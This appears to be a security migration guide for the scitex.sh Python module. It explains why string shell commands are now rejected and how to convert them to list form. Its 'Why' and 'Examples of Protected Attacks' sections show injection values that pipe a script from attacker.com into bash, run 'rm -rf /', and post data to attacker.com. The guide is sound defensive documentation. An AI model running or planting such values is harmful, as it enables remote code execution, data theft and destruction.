#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Security Migration Guide for scitex.sh

## What Changed

The `scitex.sh` module now rejects string commands for security reasons. Only list format is accepted.

## Why

String commands with `shell=True` are vulnerable to shell injection attacks:

```python
# Dangerous - allows injection
repo_name = "myrepo; curl attacker.com/steal.sh | bash"
sh(f"git clone {repo_name}")  # Server compromised!
```

## How to Update Your Code

### Before (Dangerous)

```python
from scitex.sh import sh

# String format (NO LONGER ALLOWED)
sh("ls -la")
sh(f"pdflatex {filename}")
sh("git clone " + repo_url)
```

### After (Safe)

```python
from scitex.sh import sh

# List format (REQUIRED)
sh(['ls', '-la'])
sh(['pdflatex', filename])
sh(['git', 'clone', repo_url])
```

## Common Patterns

### 1. Simple commands

```python
# Before
sh("ls")
sh("pwd")

# After
sh(['ls'])
sh(['pwd'])
```

### 2. Commands with arguments

```python
# Before
sh("ls -la /tmp")
sh("git status")

# After
sh(['ls', '-la', '/tmp'])
sh(['git', 'status'])
```

### 3. Commands with variables

```python
# Before
filename = "thesis.tex"
sh(f"pdflatex {filename}")

# After
filename = "thesis.tex"
sh(['pdflatex', filename])
```

### 4. Pipes and redirects

Pipes are no longer supported directly. Use Python instead:

```python
# Before
sh("ls | grep .py")

# After - Option 1: Use Python filtering
result = sh(['ls'])
filtered = [line for line in result['stdout'].split('\n') if '.py' in line]

# After - Option 2: Use subprocess.PIPE manually
import subprocess
p1 = subprocess.Popen(['ls'], stdout=subprocess.PIPE)
p2 = subprocess.Popen(['grep', '.py'], stdin=p1.stdout, stdout=subprocess.PIPE)
p1.stdout.close()
output = p2.communicate()[0]
```

### 5. Output redirection

```python
# Before
sh("echo hello > output.txt")

# After
result = sh(['echo', 'hello'])
with open('output.txt', 'w') as f_:
    f_.write(result['stdout'])
```

## Error Messages

If you see this error:

```
TypeError: String commands are not allowed for security reasons.
Use list format: ['command', 'arg1', 'arg2'].
```

Convert your string command to list format as shown above.

## Benefits

1. No shell injection vulnerabilities
2. Safer handling of filenames with spaces or special characters
3. More explicit and maintainable code
4. Better performance (no shell overhead)

## Examples of Protected Attacks

These attacks are now prevented:

```python
# Attack 1: Command injection
malicious_filename = "file.tex; rm -rf /"
sh(['pdflatex', malicious_filename])  # Safe - treated as literal filename

# Attack 2: Command substitution
malicious_repo = "repo$(curl attacker.com)"
sh(['git', 'clone', malicious_repo])  # Safe - treated as literal string

# Attack 3: Pipe injection
malicious_input = "input | curl -F 'data=@-' attacker.com"
sh(['cat', malicious_input])  # Safe - tries to read file literally
```

# EOF
